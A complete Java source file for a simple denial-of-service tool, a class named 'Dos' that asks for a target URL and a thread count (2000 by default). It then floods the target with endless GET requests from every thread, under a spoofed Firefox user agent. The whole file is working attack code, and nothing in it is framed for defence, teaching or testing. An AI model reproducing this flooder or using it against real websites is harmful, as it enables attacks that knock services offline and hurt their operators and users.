import java.io.*;
import java.net.*;
import java.util.Scanner;
import java.util.ArrayList;

public class Dos implements Runnable {

    private static final String USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1";
    private static String url = "";

    @Override
    public void run() {
        try {
            while (true) {
                getAttack(url); // Simplified to only perform GET attacks
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        Scanner in = new Scanner(System.in);
        try {
            System.out.print("Enter URL: ");
            url = in.nextLine();
            System.out.println("Starting Attack to URL: " + url);

            // Check connection
            checkConnection(url);

            // Get number of threads
            System.out.print("Enter number of threads: ");
            String threadCountStr = in.nextLine();
            int threadCount = threadCountStr.isEmpty() ? 2000 : Integer.parseInt(threadCountStr);

            // Start threads
            ArrayList<Thread> threads = new ArrayList<>();
            for (int i = 0; i < threadCount; i++) {
                Thread t = new Thread(new Dos());
                t.start();
                threads.add(t);
            }

            // Wait for threads to finish
            for (Thread t : threads) {
                t.join();
            }
            System.out.println("Main Thread ended");
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            in.close();
        }
    }

    private static void checkConnection(String url) {
        try {
            URL obj = new URL(url);
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
            con.setRequestMethod("GET");
            con.setRequestProperty("User-Agent", USER_AGENT);

            int responseCode = con.getResponseCode();
            if (responseCode == 200) {
                System.out.println("Connected to website");
            } else {
                System.out.println("Failed to connect: " + responseCode);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getAttack(String url) {
        try {
            URL obj = new URL(url);
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
            con.setRequestMethod("GET");
            con.setRequestProperty("User-Agent", USER_AGENT);

            int responseCode = con.getResponseCode();
            System.out.println("GET attack done!: " + responseCode);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}